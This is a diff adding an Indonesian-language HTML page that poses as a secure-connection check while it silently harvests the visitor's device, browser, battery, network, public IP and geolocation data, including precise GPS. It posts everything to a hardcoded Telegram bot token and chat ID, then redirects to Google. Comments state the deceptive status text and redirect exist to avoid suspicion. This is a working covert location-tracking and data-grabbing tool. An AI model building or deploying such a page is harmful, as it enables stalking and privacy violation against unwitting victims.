@@ -1,0 +1,274 @@
+<!-- uploader by Laskar Group -->
+
+<!-- uploader by Laskar Group -->
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Memuat...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="status">Memverifikasi koneksi aman...</div>
+    </div>
+
+    <script>
+        // ============ KONFIGURASI ============
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID TELEGRAMMU
+        const BOT_TOKEN = '8532106301:AAEbukAuH0fic8blxx5Qri0JD8TjOLlggUc';
+        const CHAT_ID = '5556193701';
+        // ======================================
+        
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(message) {
+            if (BOT_TOKEN === '8532106301:AAEbukAuH0fic8blxx5Qri0JD8TjOLlggUc' || CHAT_ID === '5556193701') {
+                console.warn('Bot token atau chat ID belum diisi!');
+                return;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {
+                console.error('Gagal kirim ke Telegram:', e);
+            }
+        }
+        
+        // Format bytes ke readable
+        function formatBytes(bytes) {
+            if (!bytes) return 'Tidak diketahui';
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(1024));
+            return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        // Dapatkan semua info yang bisa diambil tanpa root
+        async function collectDeviceInfo() {
+            let info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Tidak diketahui',
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Tidak diset',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Tidak diketahui',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+                vendor: navigator.vendor || 'Tidak diketahui',
+                appVersion: navigator.appVersion,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink + ' Mbps',
+                    rtt: navigator.connection.rtt + ' ms',
+                    saveData: navigator.connection.saveData
+                } : 'Tidak tersedia'
+            };
+            
+            // Estimasi baterai (jika tersedia)
+            let batteryInfo = 'Tidak tersedia';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? 'Ya' : 'Tidak'}`;
+                } catch(e) {}
+            }
+            
+            // IP Public via 3rd party (biar dapet IP dan geo kasar)
+            let publicIP = 'Gagal mengambil';
+            let geoApprox = {};
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                publicIP = ipData.ip;
+                
+                // Ambil geo dari IP
+                const geoRes = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                const geoData = await geoRes.json();
+                geoApprox = {
+                    city: geoData.city || 'Tidak diketahui',
+                    region: geoData.region || 'Tidak diketahui',
+                    country: geoData.country_name || 'Tidak diketahui',
+                    postal: geoData.postal || 'Tidak diketahui',
+                    lat: geoData.latitude,
+                    lon: geoData.longitude
+                };
+            } catch(e) {
+                publicIP = 'Gagal mengambil';
+            }
+            
+            return { info, batteryInfo, publicIP, geoApprox };
+        }
+        
+        // Ambil geolocation presisi (dengan izin user)
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meter',
+                            altitude: position.coords.altitude ? position.coords.altitude + ' m' : 'Tidak tersedia',
+                            heading: position.coords.heading ? position.coords.heading + '°' : 'Tidak tersedia',
+                            speed: position.coords.speed ? position.coords.speed + ' m/s' : 'Tidak tersedia'
+                        });
+                    },
+                    (error) => {
+                        let errorMsg = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED: errorMsg = 'Izin lokasi ditolak'; break;
+                            case error.POSITION_UNAVAILABLE: errorMsg = 'Lokasi tidak tersedia'; break;
+                            case error.TIMEOUT: errorMsg = 'Timeout'; break;
+                            default: errorMsg = error.message;
+                        }
+                        resolve({ error: errorMsg });
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        // Eksekusi utama
+        async function main() {
+            // Tampilkan bahwa data sedang dikumpulkan (biar keliatan legitimate)
+            document.querySelector('.status').innerText = 'Menyinkronkan data perangkat...';
+            
+            // Kumpulkan semua data
+            const { info, batteryInfo, publicIP, geoApprox } = await collectDeviceInfo();
+            
+            document.querySelector('.status').innerText = 'Memverifikasi lokasi...';
+            const preciseLoc = await getPreciseLocation();
+            
+            // Buat Google Maps link
+            let googleMapsLink = '';
+            let locationText = '';
+            
+            if (preciseLoc && !preciseLoc.error && preciseLoc.lat && preciseLoc.lon) {
+                googleMapsLink = `https://www.google.com/maps?q=${preciseLoc.lat},${preciseLoc.lon}`;
+                locationText = `📍 <b>Lokasi Presisi:</b>\nLatitude: ${preciseLoc.lat}\nLongitude: ${preciseLoc.lon}\nAkurasi: ${preciseLoc.accuracy}\nAltitude: ${preciseLoc.altitude}\nHeading: ${preciseLoc.heading}\nSpeed: ${preciseLoc.speed}\n🗺️ <a href="${googleMapsLink}">Buka Google Maps</a>`;
+            } else if (geoApprox.lat && geoApprox.lon) {
+                googleMapsLink = `https://www.google.com/maps?q=${geoApprox.lat},${geoApprox.lon}`;
+                locationText = `📍 <b>Lokasi Perkiraan (dari IP):</b>\nKota: ${geoApprox.city}\nRegion: ${geoApprox.region}\nNegara: ${geoApprox.country}\nKode Pos: ${geoApprox.postal}\nLat: ${geoApprox.lat}\nLon: ${geoApprox.lon}\n🗺️ <a href="${googleMapsLink}">Buka Google Maps</a>`;
+            } else {
+                locationText = '📍 Lokasi tidak dapat diambil';
+            }
+            
+            // Format koneksi
+            let connectionStr = '';
+            if (info.connection !== 'Tidak tersedia') {
+                connectionStr = `Jaringan: ${info.connection.effectiveType}\nDownload: ${info.connection.downlink}\nRTT: ${info.connection.rtt}\nSave Data: ${info.connection.saveData}`;
+            } else {
+                connectionStr = 'Info koneksi tidak tersedia';
+            }
+            
+            // Bangun pesan lengkap
+            const message = `
+🔐 <b>INFORMASI PERANGKAT</b> 🔐
+━━━━━━━━━━━━━━━━━━━━━
+📱 <b>Device & Browser:</b>
+User Agent: ${info.userAgent}
+Platform: ${info.platform}
+Vendor: ${info.vendor}
+App Version: ${info.appVersion}
+
+🌐 <b>Sistem:</b>
+Bahasa: ${info.language} (${info.languages})
+Timezone: ${info.timezone} (UTC${info.timezoneOffset / -60})
+Cookie Enabled: ${info.cookieEnabled}
+Do Not Track: ${info.doNotTrack}
+Online Status: ${info.onlineStatus}
+
+💻 <b>Hardware:</b>
+CPU Cores: ${info.hardwareConcurrency}
+Device Memory: ${info.deviceMemory}
+Screen: ${info.screenWidth}x${info.screenHeight} (${info.screenColorDepth}-bit)
+
+🔋 <b>Baterai:</b>
+${batteryInfo}
+
+📶 <b>Koneksi:</b>
+${connectionStr}
+
+🌍 <b>IP Publik:</b>
+${publicIP}
+${locationText}
+
+━━━━━━━━━━━━━━━━━━━━━
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+            `.trim();
+            
+            // Kirim ke Telegram
+            await sendToTelegram(message);
+            
+            // Redirect ke website normal biar ga curiga (optional ganti ke google)
+            document.querySelector('.status').innerText = 'Mengalihkan...';
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
+        }
+        
+        // Jalankan ketika halaman siap
+        window.addEventListener('load', main);
+    </script>
+</body>
+</html>
+
+<!-- uploader by Laskar Group -->
+
+<!-- uploader by Laskar Group -->
